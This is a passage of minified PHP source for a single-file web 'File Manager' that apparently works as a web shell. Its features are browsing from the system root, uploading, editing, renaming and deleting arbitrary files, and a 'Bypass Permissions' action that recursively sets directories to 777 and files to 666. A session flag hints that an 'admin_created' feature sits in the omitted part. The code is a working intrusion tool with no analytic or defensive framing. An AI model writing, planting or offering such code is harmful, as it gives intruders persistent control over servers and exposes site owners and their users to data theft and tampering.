OS,0,3))==='WIN')?getenv("SystemDrive")."\\":"/";}public function handleRequest(){if($_SERVER['REQUEST_METHOD']!=='POST')return;if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){$this->addMessage('Security error.','danger');return;}$action=isset($_POST['action'])?$_POST['action']:'';switch($action){case'upload':$this->upload();break;case'create_folder':$this->createFolder();break;case'delete':$this->deleteItem();break;case'rename':$this->renameItem();break;case'save_edit':$this->saveFile();break;case'bypass_permissions':$this->bypassPermissions();break;case'logout':session_destroy();header("Location: ".basename(__FILE__));exit;}}private function upload(){if(!isset($_FILES['file'])||$_FILES['file']['error']!==0)return;$name=basename($_FILES['file']['name']);if(move_uploaded_file($_FILES['file']['tmp_name'],$this->currentDir.'/'.$name)){$this->addMessage('File uploaded.','success');}else{$this->addMessage('Upload failed.','danger');}}private function createFolder(){$name=basename(trim(isset($_POST['folder_name'])?$_POST['folder_name']:''));if(!$name)return;$path=$this->currentDir.'/'.$name;if(!file_exists($path)&&@mkdir($path)){$this->addMessage('Folder created.','success');}else{$this->addMessage('Folder could not be created.','danger');}}private function deleteItem(){$name=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$name)return;$path=$this->currentDir.'/'.$name;if($path===__FILE__){$this->addMessage('This file cannot be deleted.','danger');return;}if($this->recursiveDelete($path)){$this->addMessage('Deleted.','warning');}else{$this->addMessage('Could not delete.','danger');}}private function renameItem(){$old=basename(isset($_POST['old_name'])?$_POST['old_name']:'');$new=basename(isset($_POST['new_name'])?$_POST['new_name']:'');if(!$old||!$new||$old===$new)return;$pOld=$this->currentDir.'/'.$old;$pNew=$this->currentDir.'/'.$new;if(file_exists($pOld)&&!file_exists($pNew)&&@rename($pOld,$pNew)){$this->addMessage('Renamed.','success');}else{$this->addMessage('Could not rename.','danger');}}private function saveFile(){$name=basename(isset($_POST['filename'])?$_POST['filename']:'');if(!$name)return;$path=$this->currentDir.'/'.$name;if(!file_exists($path)||!is_file($path)){$this->addMessage('File not found.','danger');return;}$content=isset($_POST['content'])?$_POST['content']:'';if(trim($content)===''){$this->addMessage('Cannot save empty content.','warning');return;}if(file_put_contents($path,$content)!==false){$this->addMessage('File saved.','success');}else{$this->addMessage('Could not save.','danger');}}private function bypassPermissions(){$count=0;$failed=0;$iterator=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($this->currentDir,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);foreach($iterator as $item){$path=$item->getPathname();if($item->isDir()){if(@chmod($path,0777))$count++;else $failed++;}else{if(@chmod($path,0666))$count++;else $failed++;}}@chmod(__FILE__,0666);$this->addMessage("Permission bypass: $count changed".($failed?", $failed failed":""),$failed?'warning':'success');}private function recursiveDelete($path){if(is_file($path))return @unlink($path);if(is_dir($path)){foreach(glob($path.'/*')as $item)$this->recursiveDelete($item);return @rmdir($path);}return false;}public function scanDir(){$items=@scandir($this->currentDir);if($items===false)return['folders'=>[],'files'=>[]];$result=['folders'=>[],'files'=>[]];foreach($items as $item){if($item=='.'||$item=='..')continue;$path=$this->currentDir.'/'.$item;if(is_dir($path))$result['folders'][]=$item;else $result['files'][]=$item;}return $result;}}$fm=new FileManager();$fm->handleRequest();$list=$fm->scanDir();$editMode=false;$editContent='';$editFile='';if(isset($_GET['edit'])){$fName=basename($_GET['edit']);$fPath=$fm->getCurrentDir().'/'.$fName;if(is_file($fPath)){$editMode=true;$editFile=$fName;$editContent=file_get_contents($fPath);}}?><!DOCTYPE html><html><head><meta charset="UTF-8"><title>Manager</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css"><style>body{background:#f4f6f9;padding:20px;font-family:sans-serif;}.container{max-width:1400px;margin:0 auto;background:#fff;border-radius:8px;padding:20px;box-shadow:0 4px 15px rgba(0,0,0,0.08);}.code-editor{font-family:monospace;font-size:13px;min-height:400px;background:#2d2d2d;color:#f8f8f2;border:none;padding:15px;width:100%;}.folder-list a{display:block;padding:6px 10px;color:#495057;border-radius:4px;}.folder-list a:hover{background:#e9ecef;}.folder-list i{margin-right:8px;color:#ffc107;}.breadcrumb{background:#e9ecef;padding:10px;border-radius:4px;}.sidebar{background:#f8f9fa;border-right:1px solid #dee2e6;padding:15px;min-height:80vh;}.content{padding:20px;}@media(max-width:768px){.sidebar{min-height:auto;}}</style></head><body><div class="container"><div class="row"><div class="col-md-3 sidebar"><div class="d-grid gap-2 mb-3"><a href="?dir=<?php echo urlencode($fm->getSystemRoot()); ?>" class="btn btn-outline-danger btn-sm"><i class="bi bi-hdd"></i> Root</a><a href="?dir=<?php echo urlencode(__DIR__); ?>" class="btn btn-outline-primary btn-sm"><i class="bi bi-house"></i> Home</a><a href="?dir=<?php echo urlencode(dirname($fm->getCurrentDir())); ?>" class="btn btn-secondary btn-sm"><i class="bi bi-arrow-up"></i> Up</a></div><hr><h6 class="text-muted">Folders</h6><div class="folder-list"><?php foreach($list['folders'] as $f): ?><a href="?dir=<?php echo urlencode($fm->getCurrentDir().'/'.$f); ?>"><i class="bi bi-folder-fill"></i> <?php echo htmlspecialchars($f); ?></a><?php endforeach; ?><?php if(empty($list['folders'])): ?><small class="text-muted">No folders</small><?php endif; ?></div></div><div class="col-md-9 content"><div class="d-flex justify-content-between align-items-center mb-3"><h5><i class="bi bi-terminal"></i> File Manager</h5><form method="post" class="d-inline"><input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>"><input type="hidden" name="action" value="logout"><button class="btn btn-danger btn-sm"><i class="bi bi-power"></i> Logout</button></form></div><div class="breadcrumb"><i class="bi bi-geo-alt me-2"></i> <?php echo htmlspecialchars($fm->getCurrentDir()); ?></div><?php foreach($fm->getMessages() as $msg): ?><div class="alert alert-<?php echo $msg['type']; ?>"><?php echo htmlspecialchars($msg['text']); ?></div><?php endforeach; ?><?php if(isset($_SESSION['admin_created'])): ?><div class="alert alert-<?php echo strpos($_SESSION['admin_created'],'❌')!==false?'danger':'success'; ?>"><?php echo htmlspecialchars($_SESSION['admin_created']); ?></div><?php if(strpos($_SESSION['admin_created'],'❌')===false) unset($_SESSION['admin_created']); ?><?php endif; ?><div class="mb-3"><form method="post" class="d-inline"><input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>"><input type="hidden" name="action" value="bypass_permissions"><button class="btn btn-warning btn-sm" onclick="return confirm('Set permissions to 777/666?')"><i class="bi bi-unlock"></i> Bypass Permissions</button></form></div><?php if($editMode): ?><form method="post"><input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>"><input type="hidden" name="action" value="save_edit"><input type="hidden" name="filename" value="<?php echo htmlspecialchars($editFile); ?>"><div class="card"><div class="card-header bg-dark text-white d-flex justify-content-between"><span><i class="bi bi-pencil"></i> <?php echo htmlspecialchars($editFile); ?></span><div><button class="btn btn-success btn-sm"><i class="bi bi-save"></i> Save</button><a href="?dir=<?php echo urlencode(isset($_GET['dir'])?$_GET['dir']:''); ?>" class="btn btn-secondary btn-sm">Close</a></div></div><textarea name="content" class="code-editor"><?php echo htmlspecialchars($editContent); ?></textarea></div></form><?php else: ?><div class="card p-3 mb-3"><div class="row"><div class="col-md-6"><form method="post" enctype="multipart/form-data" class="d-flex gap-2"><input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>"><input type="hidden" name="action" value="upload"><input type="file" name="file" class="form-control" required><button class="btn btn-primary"><i class="bi bi-upload"></i></button></form></div><div class="col-md-6"><form method="post" class="d-flex gap-2"><input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>"><input type="hidden" name="action" value="create_folder"><input type="text" name="folder_name" class="form-control" placeholder="New folder" required><button class="btn btn-success"><i class="bi bi-folder-plus"></i></button></form></div></div></div><div class="table-responsive"><table class="table table-hover"><thead><tr><th>Name</th><th>Permissions</th><th>Size</th><th class="text-end">Action</th></tr></thead><tbody><?php foreach($list['folders'] as $f): ?><tr><td><a href="?dir=<?php echo urlencode($fm->getCurrentDir().'/'.$f); ?>"><i class="bi bi-folder-fill text-warning"></i> <?php echo htmlspecialchars($f); ?></a></td><td><?php echo substr(sprintf('%o', fileperms($fm->getCurrentDir().'/'.$f)), -4); ?></td><td>DIR</td><td class="text-end"><button onclick="ren('<?php echo addslashes($f); ?>')" class="btn btn-sm btn-secondary"><i class="bi bi-pencil"></i></button><button onclick="del('<?php echo addslashes($f); ?>')" class="btn btn-sm btn-danger"><i class="bi bi-trash"></i></button></td></tr><?php endforeach; ?><?php foreach($list['files'] as $f): $size=round(filesize($fm->getCurrentDir().'/'.$f)/1024,1); ?><tr><td><i class="bi bi-file-text"></i> <?php echo htmlspecialchars($f); ?></td><td><?php echo substr(sprintf('%o', fileperms($fm->getCurrentDir().'/'.$f)), -4); ?></td><td><?php echo $size; ?> KB</td><td class="text-end"><a href="?edit=<?php echo urlencode($f); ?>&dir=<?php echo urlencode(isset($_GET['dir'])?$_GET['dir']:''); ?>" class="btn btn-sm btn-primary"><i class="bi bi-pencil"></i></a><button onclick="ren('<?php echo addslashes($f); ?>')" class="btn btn-sm btn-secondary"><i class="bi bi-pencil-square"></i></button><button onclick="del('<?php echo addslashes($f); ?>')" class="btn btn-sm btn-danger"><i class="bi bi-trash"></i></button></td></tr><?php endforeach; ?></tbody></table></div><?php endif; ?></div></div></div><form id="actionForm" method="post" style="display:none"><input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>"><input type="hidden" name="action" id="f_action"><input type="hidden" name="item_name" id="f_item"><input type="hidden" name="old_name" id="f_old"><input type="hidden" name="new_name" id="f_new"></form><script>function del(name){if(confirm(name+' will be deleted?')){document.getElementById('f_action').value='delete';document.getElementById('f_item').value=name;document.getElementById('actionForm').submit();}}function ren(name){let newName=prompt('New name:',name);if(newName&&newName!==name){document.getElementById('f_action').value='rename';document.getElementById('f_old').value=name;document.getElementById('f_new').value=newName;document.getElementById('actionForm').submit();}}</script></body></html>
